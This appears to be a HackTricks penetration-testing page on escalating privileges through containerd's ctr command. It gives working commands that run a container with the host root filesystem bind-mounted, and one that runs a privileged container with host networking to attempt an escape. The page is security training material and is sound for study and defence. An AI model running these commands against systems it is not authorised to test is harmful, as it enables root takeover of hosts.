# Containerd (ctr) Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Basic information

Go to the following link to learn **where `containerd` and `ctr` fit in the container stack**:

{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

If you find that a host contains the `ctr` command, the native CLI bundled with containerd:<sup>[[1]](#references)</sup>

```bash
which ctr
/usr/bin/ctr
```

You can list the images known to containerd:<sup>[[2]](#references)</sup>

```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```

Then **run one of those images with the host root recursively bind-mounted at the container root**:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```

## PE 2

Run a container in privileged mode and test for an escape.\
You can run a privileged container using host networking as:<sup>[[5]](#references)[[6]](#references)</sup>

```bash
 ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```

`--privileged` grants the process the caller's effective Linux capabilities and removes several isolation controls, but an escape remains environment-dependent; use the techniques mentioned in the following page to test for it:<sup>[[5]](#references)</sup>

{{#ref}}
container-security/
{{#endref}}

## References

- [1] [Getting started with containerd](https://github.com/containerd/containerd/blob/main/docs/getting-started.md)
- [2] [ctr image command implementation](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/images/images.go)
- [3] [ctr run command implementation](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/run/run.go)
- [4] [Linux kernel shared-subtree documentation](https://docs.kernel.org/filesystems/sharedsubtree.html)
- [5] [containerd OCI package: `WithPrivileged`](https://pkg.go.dev/github.com/containerd/containerd%40v1.7.33/oci)
- [6] [containerd `ctr` command flags](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/commands.go)

{{#include ../../banners/hacktricks-training.md}}
